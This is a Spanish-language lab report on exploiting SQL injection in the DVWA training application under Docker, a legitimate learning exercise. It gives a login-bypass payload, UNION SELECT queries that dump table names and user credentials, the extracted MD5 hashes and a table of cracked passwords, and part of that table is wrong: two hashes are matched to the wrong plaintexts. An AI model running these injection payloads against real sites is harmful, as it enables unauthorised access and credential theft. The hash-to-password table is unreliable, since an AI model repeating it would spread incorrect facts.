# Introducción

En este laboratorio se utilizó DVWA (Damn Vulnerable Web Application) desplegado mediante Docker sobre una máquina virtual con VMware para simular un entorno vulnerable.  
El objetivo fue aprender técnicas de SQL Injection en un entorno controlado y documentar paso a paso la explotación, incluyendo evidencias y análisis técnico.

---

# Entorno Técnico

- **Virtualización**: VMware Workstation 16  
- **Contenedor**: DVWA v1.10 en Docker  
- **Base de datos**: MariaDB 10.4  
- **Nivel de seguridad**: Low (modo de prueba inicial)

---

# Configuración del Entorno

## Instalación de Docker
```bash
sudo apt-get update && sudo apt-get install docker.io
Despliegue de DVWA
bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
Configuración Inicial
Acceso web: http://localhost

Usuario: admin

Contraseña: password

Explotación de SQL Injection
Bypass de Autenticación
Payload usado:

sql
' OR '1'='1
Determinación de estructura de columnas
Pruebas:

sql
1' ORDER BY 2 -- → Éxito
1' ORDER BY 3 -- → Error
Listado de tablas
sql
1' UNION SELECT table_name, NULL FROM information_schema.tables --
Extracción de credenciales
sql
1' UNION SELECT user, password FROM users --
Resultados:

admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
Crackeo de Hashes MD5
Herramienta utilizada: CrackStation
Hash	Contraseña
5f4dcc3b5aa765d61d8327deb882cf99	password
e99a18c428cb38d5f260853678922e03	abc123
8d3533d75ae2c3966d7e0d4fcc69216b	letmein
0d107d09f5bbe40cade3de5c71e9e9b7	passw0rd
Errores y Aprendizajes
Errores comunes:

Intenté usar UNION SELECT 1,2,3 sin validar el número de columnas, lo que generó un error. Tras probar con ORDER BY, confirmé que solo había 2 columnas.

Problemas con comillas al olvidar que MariaDB requiere sintaxis estricta.

Lecciones clave:

Validar número exacto de columnas antes de usar UNION.

Usar NULL en columnas no relevantes.

sqlmap es útil para automatizar pruebas complejas.

Conclusiones
DVWA en nivel 'Low' es altamente vulnerable a inyecciones SQL básicas.

Los hashes MD5 se crackearon en segundos (ej: 'password'), lo que refuerza la necesidad de usar algoritmos modernos como bcrypt.

Recomiendo probar en niveles 'Medium' o 'High' para analizar protecciones avanzadas.

Repositorio: GitHub/Lucased12